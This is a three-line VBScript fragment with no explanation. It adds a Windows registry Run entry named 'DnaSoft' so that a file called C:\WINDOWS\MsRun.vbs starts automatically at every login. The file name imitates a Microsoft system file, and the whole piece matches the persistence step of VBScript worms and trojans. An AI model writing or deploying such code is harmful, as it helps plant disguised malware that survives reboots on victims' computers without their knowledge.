Dim WSHShell
Set WSHShell = WScript.CreateObject("WScript.Shell")
WSHShell.RegWrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\DnaSoft",("C:\WINDOWS\MsRun.vbs")
